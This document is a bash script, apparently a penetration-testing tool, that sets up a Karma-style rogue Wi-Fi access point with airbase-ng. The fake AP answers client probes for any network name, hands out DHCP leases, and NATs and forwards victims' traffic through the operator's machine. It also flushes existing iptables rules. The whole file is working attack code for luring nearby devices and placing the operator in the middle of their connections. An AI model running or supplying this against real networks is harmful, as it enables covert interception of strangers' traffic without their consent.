#!/bin/bash

#start Karma and routing

wlan_int='wlan3' #the wireless interface we will use
dhcp_subnet='10.10.0.0' #the subnet you will drop your hosts into
dhcp_subnetmask='255.255.255.0'
dhcp_broadcast='10.10.0.255'
dhcp_dgw='10.10.0.10' #gateway of connected clients, should be the IP of at0
dhcp_dns='8.8.8.8' #dhs the connected clients will have
dhcp_start='10.10.0.100' #start of pool
dhcp_stop='10.10.0.150' #end of pool
ssid="LOLBUTTS" #just a placeholder, will send out probes and grab clients probing for other ESSIDS
channel='6' #channel the fake AP will run on
inet_int='eth2' #the "internet" interface that we will route traffic through


check(){
	if [ $? == 0 ]; then
		for i in {0..10}; do echo -n '.' ; sleep .1;  done; echo "COMPLETE"
		else 
		for i in {0..10}; do echo -n '.' ; done; echo "FAILED"
	fi
}

#if the config file exists, then source it, otherwise continue
if [ -f ptjkarma.conf ]; then source ptjkarma.conf; else echo "no conf file in current dir, using defaults"; fi
echo "bringing up wlan interface"
ifconfig $wlan_int up
#if mon0 does not exist, start it
if ifconfig mon0 &> /dev/null ; then echo "mon0 is up, continuing" ; else airmon-ng start $wlan_int; fi

echo -n "Cleaning the slate (killall airbase and dhcpd)"
killall airbase-ng &> /dev/null
killall dhcpd3 &> /dev/null
check

echo -n "Copying over the DHCP config"
echo "ddns-update-style ad-hoc;
default-lease-time 600;
max-lease-time 7200;
authoritative;
subnet $dhcp_subnet netmask $dhcp_subnetmask {
option subnet-mask $dhcp_subnetmask;
option broadcast-address $dhcp_broadcast;
option routers $dhcp_dgw;
option domain-name-servers $dhcp_dns;
range $dhcp_start $dhcp_stop; }" > /etc/dhcp3/dhcpd.conf
check

#airbase creates the new wireless AP and creates the at0 interface
echo -n "Starting airbase with ESSID:${ssid}"
xterm -e airbase-ng -e ${ssid} -P -c $channel -v mon0 -I 75 -C 10 &
check

#Configure at0 before bringing it up
echo -n "Initializing at0 interface"
ifconfig at0 down
ifconfig at0 $dhcp_dgw netmask $dhcp_subnetmask
ifconfig at0 up
route add -net $dhcp_subnet netmask $dhcp_subnetmask gw $dhcp_dgw
check

#Configure iptables to put your clients behind a NAT
echo -n "Modifying IPtables"
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o $inet_int -j MASQUERADE
iptables -A FORWARD -i $wlan_int -o $inet_int -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $inet_int -o $wlan_int -j ACCEPT
check

#Clear DHCP leases
echo -n "Wiping any previous DHCP leases"
echo > '/var/lib/dhcp3/dhcpd.leases'
check

#start dhcp server and enable ip forwarding
echo -n "Starting the DHCP server on at0"
xterm -e dhcpd3 -d -f -cf /etc/dhcp3/dhcpd.conf at0 &
check
echo -n "Enabling ip forwarding"
sysctl -q -w net.ipv4.ip_forward=1
check
